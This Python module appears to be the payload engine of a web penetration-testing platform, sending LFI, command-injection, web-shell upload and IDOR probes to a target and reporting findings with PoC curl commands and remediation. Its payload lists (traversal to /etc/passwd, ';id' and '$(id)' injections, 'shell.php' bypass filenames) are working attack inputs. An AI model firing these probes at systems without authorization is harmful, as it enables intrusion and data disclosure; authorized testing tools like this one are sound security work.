"""Custom payload engine — LFI/RFI, command injection, file upload, IDOR probes.

Runs in-process via httpx (no external binary). Intended only for authorized Attack Mode.
"""

from __future__ import annotations

import asyncio
import logging
import re
import time
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from app.services.target_utils import base_url, normalize_target
from app.services.tool_runner import ToolRunResult

logger = logging.getLogger(__name__)

# Conservative payload sets — proof-oriented, not destructive.
LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
]

LFI_PARAM_CANDIDATES = ["file", "page", "path", "include", "doc", "template", "lang"]

CMDI_PAYLOADS = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "%0aid",
]

CMDI_PARAM_CANDIDATES = ["cmd", "exec", "command", "ping", "host", "ip", "q"]

UPLOAD_FILENAMES = [
    "shell.php",
    "shell.php.jpg",
    "shell.phtml",
    "shell.php%00.jpg",
    "shell.PhP",
]

IDOR_ID_SHIFTS = [-1, 1, 2, 10, 100]


def _curl_for(url: str, method: str = "GET", auth_header: str | None = None) -> str:
    parts = [f"curl -sk -X {method}"]
    if auth_header:
        parts.append(f"-H 'Authorization: {auth_header}'")
    parts.append(f"'{url}'")
    return " ".join(parts)


def _auth_headers(auth_header: str | None) -> dict[str, str]:
    if not auth_header:
        return {}
    if ":" in auth_header and not auth_header.lower().startswith("bearer "):
        name, _, value = auth_header.partition(":")
        return {name.strip(): value.strip()}
    return {"Authorization": auth_header}


def _with_query(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _looks_like_passwd(body: str) -> bool:
    return "root:" in body and ("/bin/" in body or "nologin" in body or "/home/" in body)


def _looks_like_cmd_output(body: str) -> bool:
    lowered = body.lower()
    return "uid=" in lowered and "gid=" in lowered


async def run_lfi(
    target: str,
    timeout: int,
    *,
    auth_header: str | None = None,
    delay_ms: int = 0,
) -> ToolRunResult:
    url = base_url(target)
    start = time.monotonic()
    findings: list[dict[str, Any]] = []
    probes = 0
    headers = _auth_headers(auth_header)

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=min(timeout, 30)) as client:
        for param in LFI_PARAM_CANDIDATES:
            for payload in LFI_PAYLOADS:
                probes += 1
                probe_url = _with_query(url, param, payload)
                try:
                    if delay_ms > 0:
                        await asyncio.sleep(delay_ms / 1000)
                    resp = await client.get(probe_url, headers=headers)
                    body = resp.text[:8000]
                    if resp.status_code < 500 and (
                        _looks_like_passwd(body)
                        or ("PD9waH" in body and "php://filter" in payload)  # base64 <?php
                        or ("<?php" in body and "php://filter" in payload)
                    ):
                        findings.append(
                            {
                                "title": f"Local File Inclusion — param '{param}'",
                                "severity": "critical",
                                "finding_type": "lfi",
                                "description": (
                                    f"Response suggests file disclosure via '{param}' "
                                    f"using payload `{payload}`."
                                ),
                                "poc_request": f"GET {probe_url}",
                                "poc_response": body[:2000],
                                "poc_curl": _curl_for(probe_url, auth_header=auth_header),
                                "remediation": (
                                    "Never pass user input into filesystem or include paths. "
                                    "Use allowlists and chroot restricted file APIs."
                                ),
                                "references": [
                                    "https://owasp.org/www-community/attacks/Path_Traversal",
                                ],
                                "cvss_score": 9.1,
                            }
                        )
                        break
                except Exception as exc:
                    logger.debug("LFI probe error: %s", exc)
            if findings:
                break

    duration_ms = int((time.monotonic() - start) * 1000)
    if not findings:
        findings.append(
            {
                "title": "LFI probe: no confirmation",
                "severity": "info",
                "finding_type": "lfi",
                "description": f"Checked {probes} path-traversal probes without clear file disclosure.",
                "poc_curl": _curl_for(url, auth_header=auth_header),
                "remediation": None,
                "references": [],
                "cvss_score": 0.0,
            }
        )

    return ToolRunResult(
        tool_name="lfi",
        command=["custom-payload", "lfi", url],
        stdout=f"probes={probes} findings={len([f for f in findings if f['severity'] != 'info'])}",
        duration_ms=duration_ms,
        status="completed",
        parsed_output={"findings": findings, "url": url, "probes": probes},
    )


async def run_cmdi(
    target: str,
    timeout: int,
    *,
    auth_header: str | None = None,
    delay_ms: int = 0,
) -> ToolRunResult:
    url = base_url(target)
    start = time.monotonic()
    findings: list[dict[str, Any]] = []
    probes = 0
    headers = _auth_headers(auth_header)

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=min(timeout, 30)) as client:
        for param in CMDI_PARAM_CANDIDATES:
            for payload in CMDI_PAYLOADS:
                probes += 1
                probe_url = _with_query(url, param, f"127.0.0.1{payload}")
                try:
                    if delay_ms > 0:
                        await asyncio.sleep(delay_ms / 1000)
                    resp = await client.get(probe_url, headers=headers)
                    body = resp.text[:8000]
                    if _looks_like_cmd_output(body):
                        findings.append(
                            {
                                "title": f"Command Injection — param '{param}'",
                                "severity": "critical",
                                "finding_type": "cmdi",
                                "description": (
                                    f"Response contained shell id-like output for payload via '{param}'."
                                ),
                                "poc_request": f"GET {probe_url}",
                                "poc_response": body[:2000],
                                "poc_curl": _curl_for(probe_url, auth_header=auth_header),
                                "remediation": (
                                    "Avoid shelling out with user input. Use safe APIs and strict allowlists."
                                ),
                                "references": [
                                    "https://owasp.org/www-community/attacks/Command_Injection",
                                ],
                                "cvss_score": 9.8,
                            }
                        )
                        break
                except Exception as exc:
                    logger.debug("CMDi probe error: %s", exc)
            if findings:
                break

    duration_ms = int((time.monotonic() - start) * 1000)
    if not findings:
        findings.append(
            {
                "title": "Command injection probe: no confirmation",
                "severity": "info",
                "finding_type": "cmdi",
                "description": f"Checked {probes} OS command injection probes without confirmed id output.",
                "poc_curl": _curl_for(url, auth_header=auth_header),
                "remediation": None,
                "references": [],
                "cvss_score": 0.0,
            }
        )

    return ToolRunResult(
        tool_name="cmdi",
        command=["custom-payload", "cmdi", url],
        stdout=f"probes={probes}",
        duration_ms=duration_ms,
        status="completed",
        parsed_output={"findings": findings, "url": url, "probes": probes},
    )


async def run_file_upload(
    target: str,
    timeout: int,
    *,
    auth_header: str | None = None,
    delay_ms: int = 0,
) -> ToolRunResult:
    """Probe common upload endpoints with extension-bypass filenames (non-destructive polyglot)."""
    root = base_url(target)
    candidates = [
        f"{root}/upload",
        f"{root}/uploads",
        f"{root}/api/upload",
        f"{root}/file/upload",
        f"{root}/admin/upload",
    ]
    start = time.monotonic()
    findings: list[dict[str, Any]] = []
    probes = 0
    headers = _auth_headers(auth_header)
    # Harmless marker content disguised as image magic + text
    content = b"\xff\xd8\xff\xe0" + b"P4NT3XIA_UPLOAD_PROBE"

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=min(timeout, 30)) as client:
        for endpoint in candidates:
            for name in UPLOAD_FILENAMES:
                probes += 1
                try:
                    if delay_ms > 0:
                        await asyncio.sleep(delay_ms / 1000)
                    files = {"file": (name, content, "image/jpeg")}
                    resp = await client.post(endpoint, headers=headers, files=files)
                    body = resp.text[:4000]
                    interesting = resp.status_code in (200, 201) and any(
                        x in body.lower()
                        for x in ("success", "uploaded", "path", "url", "filename", name.lower())
                    )
                    if interesting or (resp.status_code in (200, 201) and len(body) < 500):
                        # Soft signal — upload accepted without hard reject
                        if resp.status_code in (200, 201) and "html" not in (resp.headers.get("content-type") or "").lower():
                            findings.append(
                                {
                                    "title": f"Upload accepted — {name} @ {endpoint}",
                                    "severity": "high",
                                    "finding_type": "file_upload",
                                    "description": (
                                        f"Endpoint returned HTTP {resp.status_code} for bypass-style filename "
                                        f"`{name}`. Manual verification required."
                                    ),
                                    "poc_request": f"POST {endpoint}\nfilename={name}",
                                    "poc_response": body[:2000],
                                    "poc_curl": (
                                        f"curl -sk -X POST {endpoint} "
                                        f"-F 'file=@{name};type=image/jpeg'"
                                        + (f" -H 'Authorization: {auth_header}'" if auth_header else "")
                                    ),
                                    "remediation": (
                                        "Validate extension allowlists server-side, check magic bytes, "
                                        "store outside webroot, rename uploads, and serve with fixed Content-Type."
                                    ),
                                    "references": [
                                        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                                    ],
                                    "cvss_score": 8.1,
                                }
                            )
                            break
                except Exception as exc:
                    logger.debug("Upload probe error: %s", exc)
            if findings:
                break

    duration_ms = int((time.monotonic() - start) * 1000)
    if not findings:
        findings.append(
            {
                "title": "File upload probe: no clear accept",
                "severity": "info",
                "finding_type": "file_upload",
                "description": f"Probed {probes} upload paths/filenames without clear acceptance signals.",
                "poc_curl": _curl_for(f"{root}/upload", method="POST", auth_header=auth_header),
                "remediation": None,
                "references": [],
                "cvss_score": 0.0,
            }
        )

    return ToolRunResult(
        tool_name="file_upload",
        command=["custom-payload", "file_upload", root],
        stdout=f"probes={probes}",
        duration_ms=duration_ms,
        status="completed",
        parsed_output={"findings": findings, "url": root, "probes": probes},
    )


async def run_idor(
    target: str,
    timeout: int,
    *,
    auth_header: str | None = None,
    delay_ms: int = 0,
) -> ToolRunResult:
    """Autorize-like numeric ID tampering on URL path/query."""
    url = normalize_request_url(target)
    start = time.monotonic()
    findings: list[dict[str, Any]] = []
    probes = 0
    headers = _auth_headers(auth_header)

    id_pattern = re.compile(r"(?<=/)(\d{1,10})(?=/|$)|([?&](?:id|user_id|uid|order_id|account)=)(\d{1,10})")

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=min(timeout, 30)) as client:
        try:
            baseline = await client.get(url, headers=headers)
            baseline_body = baseline.text
            baseline_len = len(baseline_body)
        except Exception as exc:
            duration_ms = int((time.monotonic() - start) * 1000)
            return ToolRunResult(
                tool_name="idor",
                command=["custom-payload", "idor", url],
                stderr=str(exc),
                duration_ms=duration_ms,
                status="failed",
                parsed_output={"findings": []},
            )

        matches = list(id_pattern.finditer(url))
        if not matches:
            # Append id=1 and compare neighboring IDs
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            if "id" not in qs:
                qs["id"] = ["1"]
                url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                try:
                    baseline = await client.get(url, headers=headers)
                    baseline_body = baseline.text
                    baseline_len = len(baseline_body)
                except Exception:
                    pass
            matches = list(id_pattern.finditer(url))

        for match in matches[:3]:
            groups = match.groups()
            if groups[0]:
                original = groups[0]
                prefix = url[: match.start(1)]
                suffix = url[match.end(1) :]
                make_url = lambda n: f"{prefix}{n}{suffix}"  # noqa: E731
            else:
                original = groups[2]
                prefix = url[: match.start(3)]
                suffix = url[match.end(3) :]
                make_url = lambda n: f"{prefix}{n}{suffix}"  # noqa: E731

            try:
                orig_id = int(original)
            except ValueError:
                continue

            for shift in IDOR_ID_SHIFTS:
                new_id = max(1, orig_id + shift)
                if new_id == orig_id:
                    continue
                probe_url = make_url(new_id)
                probes += 1
                try:
                    if delay_ms > 0:
                        await asyncio.sleep(delay_ms / 1000)
                    resp = await client.get(probe_url, headers=headers)
                    body = resp.text
                    # Same status + different body size may indicate accessible object
                    if resp.status_code == baseline.status_code == 200 and abs(len(body) - baseline_len) > 50:
                        if body != baseline_body:
                            findings.append(
                                {
                                    "title": f"Possible IDOR — id {orig_id} → {new_id}",
                                    "severity": "high",
                                    "finding_type": "idor",
                                    "description": (
                                        f"Tampered ID returned HTTP {resp.status_code} with a distinct body "
                                        f"(Δ{abs(len(body) - baseline_len)} bytes). Verify authorization."
                                    ),
                                    "poc_request": f"GET {probe_url}",
                                    "poc_response": body[:2000],
                                    "poc_curl": _curl_for(probe_url, auth_header=auth_header),
                                    "remediation": (
                                        "Enforce object-level authorization on every request; "
                                        "do not rely on obscurity of sequential IDs."
                                    ),
                                    "references": [
                                        "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
                                    ],
                                    "cvss_score": 7.5,
                                }
                            )
                            break
                except Exception as exc:
                    logger.debug("IDOR probe error: %s", exc)
            if findings:
                break

    duration_ms = int((time.monotonic() - start) * 1000)
    if not findings:
        findings.append(
            {
                "title": "IDOR probe: no clear BOLA signal",
                "severity": "info",
                "finding_type": "idor",
                "description": f"Ran {probes} ID-tamper probes without distinct authorized object responses.",
                "poc_curl": _curl_for(url, auth_header=auth_header),
                "remediation": None,
                "references": [],
                "cvss_score": 0.0,
            }
        )

    return ToolRunResult(
        tool_name="idor",
        command=["custom-payload", "idor", url],
        stdout=f"probes={probes}",
        duration_ms=duration_ms,
        status="completed",
        parsed_output={"findings": findings, "url": url, "probes": probes},
    )


def normalize_request_url(raw: str) -> str:
    value = normalize_target(raw)
    if "://" not in value:
        return f"https://{value}"
    return value
